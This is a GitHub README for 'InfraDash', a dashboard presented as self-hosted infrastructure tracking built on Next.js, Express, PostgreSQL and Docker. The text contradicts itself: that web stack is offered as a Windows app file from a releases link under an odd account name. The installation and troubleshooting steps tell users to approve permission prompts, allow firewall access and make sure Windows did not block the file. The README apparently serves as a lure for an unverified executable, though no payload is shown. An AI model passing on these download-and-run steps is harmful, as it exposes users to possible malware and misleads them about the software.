# 🧭 InfraDash - Manage Infrastructure in One Place

[![Download InfraDash](https://img.shields.io/badge/Download-InfraDash-2b6cb0?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Marrileedoublebass342/InfraDash/releases)

## 🚀 What InfraDash Does

InfraDash is a self-hosted dashboard for tracking your infrastructure in one view. It helps you keep an eye on servers, virtual machines, disks, IP addresses, and network links.

It uses a visual 2D workspace so you can see how parts of your setup connect. That makes it easier to check what is running, what is connected, and what needs attention.

InfraDash runs with Next.js, Express, PostgreSQL, and Docker. It is built for home labs and small teams that want a clean way to manage systems from a browser.

## 📥 Download InfraDash

Visit this page to download:
https://github.com/Marrileedoublebass342/InfraDash/releases

Open the latest release for Windows and get the file listed there. If the release page includes more than one file, choose the Windows version.

## 🪟 Install on Windows

1. Open the download page in your browser.
2. Find the latest release at the top of the page.
3. Download the Windows file from that release.
4. If the file is in a ZIP folder, right-click it and choose Extract All.
5. Open the extracted folder.
6. Double-click the app file to run InfraDash.
7. If Windows asks for permission, choose Yes.
8. If you see a firewall prompt, allow access so the app can connect to your local services.
9. Keep the app open while you use the dashboard.

If the release includes an installer, run the installer instead of opening a folder.

## 🖥️ What You Need

InfraDash works best on a Windows 10 or Windows 11 PC.

You should also have:

- A modern web browser
- Enough free disk space for your data
- Access to the servers, VMs, or devices you want to track
- Docker installed only if you plan to run the backend and database yourself

For smooth use, keep your system updated and make sure your browser allows local web apps.

## 🛠️ First Run Setup

When you open InfraDash for the first time, you may need to set up a few basic items:

1. Start the app.
2. Open the dashboard in your browser if it does not open on its own.
3. Create your main admin account if the setup screen appears.
4. Add your PostgreSQL connection details if you are running your own database.
5. Save your settings.
6. Reload the page if the dashboard does not appear right away.

If you use Docker, start the containers before opening the app.

## 📊 Main Things You Can Track

InfraDash gives you a clean view of your infrastructure. You can use it to track:

- Servers and host machines
- Virtual machines
- Disk usage and storage health
- IP addresses and address groups
- Network links and connections
- Layouts in a visual 2D workspace

This helps you spot gaps, duplicates, and weak points in your setup.

## 🧭 Using the 2D Workspace

The 2D workspace gives you a simple map of your infrastructure.

You can use it to:

- Place machines where they make sense to you
- Draw connections between systems
- Group related parts together
- See how one device depends on another
- Keep a large setup easier to read

This view works well for a home lab, a test network, or a small server room.

## 🐳 Docker Setup

InfraDash supports Docker for local self-hosting.

A common setup includes:

- One container for the app
- One container for the API
- One PostgreSQL container for data

If you already use Docker, this can make setup easier. Start the stack, then open the app in your browser after the containers are running.

## 🗄️ PostgreSQL Database

InfraDash stores its data in PostgreSQL. This keeps your records in one place and makes it easier to manage larger setups.

Typical data stored in the database includes:

- Asset records
- Device names
- IP details
- Network links
- Workspace layout data
- User settings

If you are using your own PostgreSQL server, make sure the app can reach it on your network.

## 🔐 Basic Security Tips

Because InfraDash is self-hosted, you control where it runs and who can reach it.

Use a strong password for your admin account. If you open it on a network, keep access limited to trusted users. If you place it behind a router or reverse proxy, check your network rules before exposing it outside your home or office.

## 🧩 Common Uses

InfraDash fits well in setups like these:

- Home labs
- Small business server tracking
- Test environments
- Rack and device planning
- IP and asset records for local teams

It works best when you want one place to see your systems without using several different tools.

## ❓ Troubleshooting

If InfraDash does not open:

- Check that the app file finished downloading
- Make sure Windows did not block the file
- Confirm the app or Docker containers are running
- Refresh the browser page
- Restart the app
- Check that PostgreSQL is running if you use your own database

If the screen stays blank, try another browser or clear the page cache.

If connections do not show up, check that your device records and link data were saved.

## 📌 Project Tags

dashboard, devops, docker, homelab, infrastructure, nextjs, postgresql, prisma, react, self-hosted, server-management, tailwindcss, typescript